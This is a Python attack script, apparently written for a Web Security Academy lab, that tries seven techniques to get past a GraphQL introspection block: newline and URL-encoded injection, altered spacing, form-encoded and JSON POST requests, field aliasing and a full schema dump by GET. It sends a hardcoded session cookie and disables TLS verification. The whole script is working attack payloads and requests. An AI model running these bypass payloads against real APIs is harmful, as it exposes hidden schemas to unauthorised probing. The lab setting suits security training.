#!/usr/bin/env python3
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://0a1000fc04d4fc0eb52e0496005100d9.web-security-academy.net/api"
SESSION = "GPdO56RgzjaIq6mPvQxz7jbi758RfNkf"

headers = {"Cookie": f"session={SESSION}"}

print("[*] Attempting introspection bypass techniques...\n")

# Technique 1: Newline injection
print("[1] Trying newline injection...")
query1 = "query{__schema\n{queryType{name}}}"
response = requests.get(URL, params={"query": query1}, headers=headers, verify=False)
print(f"Response: {response.text[:200]}\n")

# Technique 2: URL encoding
print("[2] Trying URL encoded introspection...")
query2 = "query{__schema%0A{queryType{name}}}"
response = requests.get(f"{URL}?query={query2}", headers=headers, verify=False)
print(f"Response: {response.text[:200]}\n")

# Technique 3: Spaces instead of newlines
print("[3] Trying spaces...")
query3 = "query{ __schema {queryType{name}}}"
response = requests.get(URL, params={"query": query3}, headers=headers, verify=False)
print(f"Response: {response.text[:200]}\n")

# Technique 4: POST with x-www-form-urlencoded
print("[4] Trying POST with x-www-form-urlencoded...")
headers_form = {
    "Cookie": f"session={SESSION}",
    "Content-Type": "application/x-www-form-urlencoded"
}
data = {"query": "{__schema{queryType{name}}}"}
response = requests.post(URL, data=data, headers=headers_form, verify=False)
print(f"Response: {response.text[:200]}\n")

# Technique 5: Full introspection via GET
print("[5] Trying full introspection via GET...")
full_introspection = """
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
      }
    }
  }
}
"""
response = requests.get(URL, params={"query": full_introspection}, headers=headers, verify=False)
print(f"Status: {response.status_code}")
if response.status_code == 200:
    data = response.json()
    if 'data' in data and '__schema' in str(data):
        print("✓✓✓ INTROSPECTION SUCCESSFUL! ✓✓✓")
        print(response.text[:500])
    else:
        print(f"Response: {response.text[:300]}")
print()

# Technique 6: Obfuscation with aliases
print("[6] Trying field aliasing...")
query6 = "{alias:__schema{queryType{name}}}"
response = requests.get(URL, params={"query": query6}, headers=headers, verify=False)
print(f"Response: {response.text[:200]}\n")

# Technique 7: POST with JSON but to different endpoint
print("[7] Trying POST with JSON...")
headers_json = {
    "Cookie": f"session={SESSION}",
    "Content-Type": "application/json"
}
json_data = {"query": "{__schema{queryType{name}}}"}
response = requests.post(URL, json=json_data, headers=headers_json, verify=False)
print(f"Response: {response.text[:200]}\n")

print("[*] Bypass attempts complete")
